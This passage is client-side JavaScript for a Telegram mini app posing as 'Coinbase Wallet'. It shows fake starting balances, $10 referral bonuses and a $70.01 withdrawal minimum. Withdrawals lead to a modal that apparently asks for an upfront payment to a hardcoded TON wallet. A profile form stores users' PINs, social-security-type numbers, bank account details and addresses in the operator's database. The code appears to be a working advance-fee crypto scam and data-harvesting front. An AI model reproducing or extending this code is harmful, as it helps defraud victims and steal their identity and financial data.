        let btcPrice = await fetchBTCPrice();
        let userWalletAddress = "0xA1Ed1234567890abcdef1234567890abcdef1234";

        // Refresh BTC price every 5 minutes
        setInterval(async () => {
          if (Date.now() - (window.lastBtcPriceFetch || 0) >= 5 * 60 * 1000) {
            btcPrice = await fetchBTCPrice();
            await updateBalanceDisplay();
          }
        }, 5 * 60 * 1000);

        // Copy wallet address
        $("#copyAddress").on("click", async () => {
          try {
            const snapshot = await get(userRef);
            const userData = snapshot.val() || {};
            const walletToCopy = userData.wallet || userWalletAddress;
            await copyToClipboard(walletToCopy);
            showToast("Wallet address copied to clipboard!");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
          }
        });

        // Copy deposit address
        $("#copyIt").on("click", async () => {
          try {
            await copyToClipboard(depositAddress);
            showToast("Deposit address copied to clipboard!");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy deposit address: ${error.message}`, position: "topRight" });
          }
        });

        // Share referral link
        $("#share-button").on("click", async () => {
          const referralLink = `https://t.me/CoinbaseTrumpbot/coinbase?startapp=ref${userId}`;
          try {
            await copyToClipboard(referralLink);
            $("#darkModal5").iziModal("open");
            showToast("Referral link copied to clipboard!");
            if (window.Telegram?.WebApp?.showShare) {
              window.Telegram.WebApp.showShare({
                url: referralLink,
                text: "Join Coinbase Wallet and earn $10 per referral!"
              });
            }
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy referral link: ${error.message}`, position: "topRight" });
          }
        });

        // Update user data
        onValue(userRef, (snapshot) => {
          const userData = snapshot.val() || {};
          $("#usernameInput").val(userData.username || username);
          $("#fullNameInput").val(userData.fullName || "");
          $("#emailInput").val(userData.email || "");
          $("#pinInput").val(userData.pin || "");
          $("#ssinInput").val(userData.ssin || "");
          $("#accountNumberInput").val(userData.accountNumber || "");
          $("#bankNameInput").val(userData.bankName || "");
          $("#addressInput").val(userData.address || "");
          $("#account-name").text(`@${userData.username || "Anonymous"}`);
          const walletAddress = userData.wallet || userWalletAddress;
          $("#wallet-address").text(window.truncateAddress(walletAddress));
          $("#wallet-address").data("wallet", walletAddress);
          userWalletAddress = walletAddress;
          $("#themeSelect").val(userData.settings?.theme || "dark");
          $("#currencySelect").val(userData.settings?.currency || "USD");
          $("body").removeClass("light dark").addClass(userData.settings?.theme || "dark");
          updateBalanceDisplay();
        });

        // Profile form submission
        $("#profile-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitProfileInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Saving...');

          const fullName = $("#fullNameInput").val().trim();
          const email = $("#emailInput").val().trim();
          const pin = $("#pinInput").val().trim();
          const ssin = $("#ssinInput").val().trim();
          const accountNumber = $("#accountNumberInput").val().trim();
          const bankName = $("#bankNameInput").val().trim();
          const address = $("#addressInput").val().trim();

          if (!fullName) {
            iziToast.error({ title: "Error", message: "Full Name is required!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
            return;
          }
          if (!/^[0-9]{4}$|^[0-9]{6}$/.test(pin)) {
            iziToast.error({ title: "Error", message: "PIN must be 4 or 6 digits!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
            return;
          }

          try {
            await update(userRef, { fullName, email, pin, ssin, accountNumber, bankName, address });
            iziToast.success({ title: "Success", message: "Profile updated!", position: "topRight" });
            $("#profile-iziModal").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to update profile: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
          }
        });

        // Settings form submission
        $("#settings-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitSettingsInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Saving...');

          const theme = $("#themeSelect").val();
          const currency = $("#currencySelect").val();

          try {
            await update(ref(database, `users/${userId}/settings`), { theme, currency });
            $("body").removeClass("light dark").addClass(theme);
            await updateBalanceDisplay();
            iziToast.success({ title: "Success", message: "Settings saved!", position: "topRight" });
            $("#settings-iziModal").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to save settings: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Save");
          }
        });

        // Notifications
        onValue(ref(database, `users/${userId}/notifications`), (snapshot) => {
          const notifications = snapshot.val() || {};
          const list = $("#notification-table-body");
          list.empty();
          if (Object.keys(notifications).length) {
            Object.values(notifications).forEach(notif => {
              list.append(`
                <li>
                  <strong>${notif.title}</strong><br>
                  ${notif.message}<br>
                  <small>${new Date(notif.timestamp).toLocaleString()}</small>
                </li>
              `);
            });
          } else {
            list.append(`<li>No new notifications. Check back later!</li>`);
          }
        });

        // Transactions
        onValue(ref(database, `users/${userId}/transactions`), (snapshot) => {
          const transactions = snapshot.val() || {};
          const tbody = $("#transaction-table-body");
          tbody.empty();
          if (Object.keys(transactions).length) {
            Object.entries(transactions).forEach(([txId, tx]) => {
              const displayWallet = window.truncateAddress(tx.wallet);
              const amountDisplay = tx.type === "Fee" ? `${tx.amount.toFixed(2)} TON` : `$${tx.amount.toFixed(2)}`;
              tbody.append(`
                <tr>
                  <td>${amountDisplay}</td>
                  <td class="wallet-cell">
                    ${displayWallet}
                    ${tx.wallet !== "N/A" ? `<button class="btn-copy" data-wallet="${tx.wallet}" title="Copy full address"><i class="fas fa-copy"></i></button>` : ""}
                  </td>
                  <td>${tx.type}</td>
                  <td>${tx.status}</td>
                  <td>${new Date(tx.timestamp).toLocaleString()}</td>
                </tr>
              `);
            });
          } else {
            tbody.append(`<tr><td colspan="5">No transactions found.</td></tr>`);
          }
        });

        // Copy transaction wallet address
        $(document).on("click", ".btn-copy", async function() {
          const walletAddress = $(this).data("wallet");
          try {
            await copyToClipboard(walletAddress);
            showToast("Wallet address copied to clipboard!");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to copy wallet address: ${error.message}`, position: "topRight" });
          }
        });

        // Handle referrals
        const urlParams = new URLSearchParams(window.location.search);
        const startParam = urlParams.get("tgWebAppStartParam");
        const referrerId = startParam ? startParam.replace("ref", "") : null;

        if (referrerId && referrerId !== userId) {
          try {
            const snapshot = await get(userRef);
            if (!snapshot.exists()) {
              const walletAddress = userId === "54321" ? "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy" : generateEthAddress();
              await set(userRef, {
                username: username,
                fullName: "",
                email: "",
                pin: "",
                ssin: "",
                accountNumber: "",
                bankName: "",
                address: "",
                balance: 78.01,
                wallet: walletAddress,
                referrals: 0,
                referredBy: referrerId,
                settings: { theme: "dark", currency: "USD" },
                notifications: {
                  welcome: {
                    title: "Welcome!",
                    message: "Thanks for joining Coinbase Wallet via referral!",
                    timestamp: new Date().toISOString(),
                  },
                },
                transactions: {},
              });
              const referrerSnapshot = await get(ref(database, `users/${referrerId}`));
              if (referrerSnapshot.exists()) {
                const referrerData = referrerSnapshot.val();
                await update(ref(database, `users/${referrerId}`), {
                  referrals: (referrerData.referrals || 0) + 1,
                  balance: (referrerData.balance || 0) + 10,
                });
                await push(ref(database, `users/${referrerId}/transactions`), {
                  amount: 10,
                  wallet: "N/A",
                  type: "Referral Bonus",
                  status: "completed",
                  timestamp: new Date().toISOString(),
                });
              }
            }
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to process referral: ${error.message}`, position: "topRight" });
          }
        }

        // Update referrals
        async function updateReferrals(userId) {
          try {
            const usersSnapshot = await get(ref(database, `users`));
            const usersData = usersSnapshot.val() || {};
            let totalReferred = 0;
            for (const uid in usersData) {
              if (usersData[uid]?.referredBy === userId) {
                totalReferred++;
              }
            }
            await update(userRef, { referrals: totalReferred });
            return totalReferred;
          } catch (error) {
            console.error("Failed to update referrals:", error);
            iziToast.error({ title: "Error", message: `Failed to update referrals: ${error.message}`, position: "topRight" });
            return 0;
          }
        }

        onValue(ref(database, `users`), (snapshot) => {
          if (snapshot.exists()) {
            updateReferrals(userId);
          }
        });

        // Withdraw button
        $(".open-withdraw").on("click", async () => {
          try {
            await updateReferrals(userId);
            const snapshot = await get(userRef);
            const userData = snapshot.val() || {};
            const userBalance = userData.balance || 0;

            if (userBalance < 70.01) {
              const remainingBalance = 70.01 - userBalance;
              const message = `You need a minimum balance of $70.01 to withdraw. You need $${remainingBalance.toFixed(2)} more in your balance. Current balance: $${userBalance.toFixed(2)}.`;
              $("#withdraw-message").text(message);
              $("#darkModal2").iziModal("open");
              return;
            }

            const userPaidCookie = document.cookie.split("; ").find(row => row.startsWith("userPaid="));
            const userPaid = userPaidCookie ? userPaidCookie.split("=")[1] : null;

            if (userPaid === "paid") {
              $("#darkModal7").iziModal("open");
            } else {
              $("#darkModal8").iziModal("open");
              $("#continuePaymentText").html("Continue »");
            }
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to check eligibility: ${error.message}`, position: "topRight" });
          }
        });

        // Continue payment
        $("#continuePayment").on("click", () => {
          try {
            document.cookie = `userWithdrawal=pending; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
            document.cookie = `userPaid=paid; expires=${new Date(Date.now() + 86400000).toUTCString()}; path=/`;
            $("#darkModal8").iziModal("close");
            $("#darkModal9").iziModal("open");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to process payment continuation: ${error.message}`, position: "topRight" });
          }
        });

        // Close pending modal
        $("#continuePaymentCls").on("click", () => {
          try {
            $("#darkModal9").iziModal("close");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to close modal: ${error.message}`, position: "topRight" });
          }
        });

        // Withdraw form submission
        $("#wallet-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitWalletInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Processing...');

          const recipientWallet = $("#walletInput").val().trim();
          const amount = parseFloat($("#wallet_amountInput").val().trim());
          const feeWallet = "UQC1f5pf5qcK5gO1Dju5l5O9Xua_2M8W71Qn-Z0HfkO8aTDy";
          const feeAmount = 2;

          if (!recipientWallet) {
            iziToast.error({ title: "Error", message: "Recipient wallet address is required!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
            return;
          }
          if (isNaN(amount) || amount <= 0) {
            iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
            return;
          }
          if (recipientWallet.toLowerCase() === userWalletAddress.toLowerCase()) {
            iziToast.error({ title: "Error", message: "You cannot withdraw funds to your own wallet!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
            return;
          }

          try {
            const usersSnapshot = await get(ref(database, `users`));
            const users = usersSnapshot.val() || {};
            let recipientId = null;
            for (const uid in users) {
              if (users[uid].wallet?.toLowerCase() === recipientWallet.toLowerCase()) {
                recipientId = uid;
                break;
              }
            }
            if (!recipientId) {
              iziToast.error({
                title: "Error",
                message: `Recipient wallet ${window.truncateAddress(recipientWallet)} not found in the app!`,
                position: "topRight"
              });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            const snapshot = await get(ref(database, `users/${userId}/balance`));
            const currentBalance = snapshot.val() || 0;
            if (amount + feeAmount > currentBalance) {
              $("#insufficient-balance").removeClass("hide");
              iziToast.error({
                title: "Error",
                message: `Insufficient balance! Current: $${currentBalance.toFixed(2)}, Requested: $${(amount + feeAmount).toFixed(2)} (including 2 TON fee)`,
                position: "topRight"
              });
              submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
              return;
            }

            const senderTxRef = push(ref(database, `users/${userId}/transactions`));
            const recipientTxRef = push(ref(database, `users/${recipientId}/transactions`));
            const feeTxRef = push(ref(database, `users/${userId}/transactions`));
            const updates = {
              [`users/${userId}/balance`]: currentBalance - amount - feeAmount,
              [`users/${recipientId}/balance`]: (users[recipientId].balance || 0) + amount,
              [`users/${userId}/transactions/${senderTxRef.key}`]: {
                amount,
                wallet: recipientWallet,
                type: "Withdraw",
                status: "pending",
                timestamp: new Date().toISOString(),
              },
              [`users/${recipientId}/transactions/${recipientTxRef.key}`]: {
                amount,
                wallet: userWalletAddress,
                type: "Receive",
                status: "completed",
                timestamp: new Date().toISOString(),
              },
              [`users/${userId}/transactions/${feeTxRef.key}`]: {
                amount: feeAmount,
                wallet: feeWallet,
                type: "Fee",
                status: "completed",
                timestamp: new Date().toISOString(),
              },
              [`users/${recipientId}/notifications/${Date.now()}`]: {
                title: "Funds Received",
                message: `You received $${amount.toFixed(2)} from ${username || "Anonymous"}!`,
                timestamp: new Date().toISOString(),
              },
            };

            await update(ref(database), updates);
            document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
            document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
            iziToast.success({
              title: "Success",
              message: `Withdrawal of $${amount.toFixed(2)} requested to ${window.truncateAddress(recipientWallet)}!`,
              position: "topRight"
            });
            $("#darkModal7").iziModal("close");
            $("#darkModal9").iziModal("open");
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to process withdrawal: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Withdraw");
            $("#insufficient-balance").addClass("hide");
          }
        });

        // Send form submission
        $("#send-form").on("submit", async (e) => {
          e.preventDefault();
          const submitButton = $("#submitSendInfo");
          submitButton
            .prop("disabled", true)
            .addClass("loading")
            .html('<i class="fas fa-spinner fa-spin-pulse"></i> Processing...');

          const recipientWallet = $("#sendWalletInput").val().trim();
          const amount = parseFloat($("#sendAmountInput").val().trim());

          if (!recipientWallet) {
            iziToast.error({ title: "Error", message: "Recipient wallet address is required!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Send");
            return;
          }
          if (isNaN(amount) || amount <= 0) {
            iziToast.error({ title: "Error", message: "Invalid amount!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Send");
            return;
          }
          if (recipientWallet.toLowerCase() === userWalletAddress.toLowerCase()) {
            iziToast.error({ title: "Error", message: "You cannot send funds to your own wallet!", position: "topRight" });
            submitButton.prop("disabled", false).removeClass("loading").val("Send");
            return;
          }

          try {
            const usersSnapshot = await get(ref(database, `users`));
            const users = usersSnapshot.val() || {};
            let recipientId = null;
            for (const uid in users) {
              if (users[uid].wallet?.toLowerCase() === recipientWallet.toLowerCase()) {
                recipientId = uid;
                break;
              }
            }
            if (!recipientId) {
              iziToast.error({
                title: "Error",
                message: `Recipient wallet ${window.truncateAddress(recipientWallet)} not found in the app!`,
                position: "topRight"
              });
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }

            const snapshot = await get(ref(database, `users/${userId}/balance`));
            const currentBalance = snapshot.val() || 0;
            if (amount > currentBalance) {
              $("#insufficient-send-balance").removeClass("hide");
              iziToast.error({
                title: "Error",
                message: `Insufficient balance! Current: $${currentBalance.toFixed(2)}, Requested: $${amount.toFixed(2)}`,
                position: "topRight"
              });
              submitButton.prop("disabled", false).removeClass("loading").val("Send");
              return;
            }

            const senderTxRef = push(ref(database, `users/${userId}/transactions`));
            const recipientTxRef = push(ref(database, `users/${recipientId}/transactions`));
            const updates = {
              [`users/${userId}/balance`]: currentBalance - amount,
              [`users/${recipientId}/balance`]: (users[recipientId].balance || 0) + amount,
              [`users/${userId}/transactions/${senderTxRef.key}`]: {
                amount,
                wallet: recipientWallet,
                type: "Send",
                status: "completed",
                timestamp: new Date().toISOString(),
              },
              [`users/${recipientId}/transactions/${recipientTxRef.key}`]: {
                amount,
                wallet: userWalletAddress,
                type: "Receive",
                status: "completed",
                timestamp: new Date().toISOString(),
              },
              [`users/${recipientId}/notifications/${Date.now()}`]: {
                title: "Funds Received",
                message: `You received $${amount.toFixed(2)} from ${username || "Anonymous"}!`,
                timestamp: new Date().toISOString(),
              },
            };

            await update(ref(database), updates);
            iziToast.success({
              title: "Success",
              message: `Sent $${amount.toFixed(2)} to ${window.truncateAddress(recipientWallet)}!`,
              position: "topRight"
            });
            $("#darkModal1").iziModal("close");
            $("#send-form")[0].reset();
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to send funds: ${error.message}`, position: "topRight" });
          } finally {
            submitButton.prop("disabled", false).removeClass("loading").val("Send");
            $("#insufficient-send-balance").addClass("hide");
          }
        });

        // Logout
        $("#logout-btn").on("click", () => {
          try {
            document.cookie = `userWithdrawal=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
            document.cookie = `userPaid=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/`;
            window.Telegram.WebApp.close();
            iziToast.success({ title: "Success", message: "Logged out successfully!", position: "topRight" });
          } catch (error) {
            iziToast.error({ title: "Error", message: `Failed to logout: ${error.message}`, position: "topRight" });
          }
        });
      });
    });
  </script>
</body>
</html>